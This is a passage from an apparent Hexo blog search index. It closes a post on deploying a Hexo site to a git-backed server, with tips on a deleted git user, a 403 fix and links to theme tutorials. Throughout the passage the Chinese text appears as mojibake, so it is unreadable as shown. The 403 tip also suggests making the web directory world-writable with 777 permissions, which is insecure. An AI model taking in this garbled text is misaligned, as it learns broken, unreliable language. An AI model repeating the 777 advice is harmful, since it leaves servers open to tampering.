<h3 id="Linuxç”¨æˆ·åˆ é™¤"><a href="#Linuxç”¨æˆ·åˆ é™¤" class="headerlink" title="Linuxç”¨æˆ·åˆ é™¤"></a>Linuxç”¨æˆ·åˆ é™¤</h3><p>å¦‚æœå’Œæˆ‘ä¸€æ ·åœ¨Linuxé‡Œä¸€æ°”ä¹‹ä¸‹è¯¯åˆ gitç”¨æˆ·æ–‡ä»¶çš„è¯å¯ä»¥ç”¨çœ‹çœ‹<a href="https://blog.csdn.net/luxiaosi520/article/details/90483981?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">è¿™ç¯‡åšå®¢</a>ï¼ˆæ— èƒ½ç‹‚æ€’ï¼‰</p>
<h3 id="403è§£å†³"><a href="#403è§£å†³" class="headerlink" title="403è§£å†³"></a>403è§£å†³</h3><p>æœ€åå¦‚æœä½ åœ¨æœ¬åœ°å’ŒæœåŠ¡ç«¯éƒ½æ­å¥½ä½†æ˜¯ç½‘é¡µæ˜¯403ï¼Œè€Œä¸”www/websiteç›®å½•ä¸‹æ²¡æœ‰æ–‡ä»¶çš„è¯å¯ä»¥è¯•ç€å§www/websiteçš„æƒé™è½¬è®©ç»™gitï¼Œæˆ–è€…ç›´æ¥777å…¬å¼€ï¼Œç„¶åå†åœ¨æœ¬åœ°è¿›è¡Œhexo dæ“ä½œï¼Œå°±å¯ä»¥çœ‹åˆ°ç½‘é¡µäº†ã€‚</p>
<h3 id="æ­å»ºæ•™ç¨‹"><a href="#æ­å»ºæ•™ç¨‹" class="headerlink" title="æ­å»ºæ•™ç¨‹"></a>æ­å»ºæ•™ç¨‹</h3><p>1.<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029" target="_blank" rel="noopener">æ­Github page</a></p>
<p>2.<a href="https://blog.csdn.net/NoCortY/article/details/99631249?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">æ­æœåŠ¡å™¨ç«¯</a></p>
<p>3.<a href="https://www.jianshu.com/p/f054333ac9e6" target="_blank" rel="noopener">Nextæ¯”è¾ƒå…¨çš„ç¾åŒ–æ•™ç¨‹</a></p>
<p>4.<a href="https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B" target="_blank" rel="noopener">Butterflyç¾åŒ–</a></p>
<!--æœåŠ¡å™¨å¤ªè„†ç»ä¸èµ·é»‘ï¼Œä¿ºä¸ä¼šç»´æŠ¤ï¼Œè¿˜æœ›å„ä½æ‰‹ä¸‹ç•™æƒ…-->]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
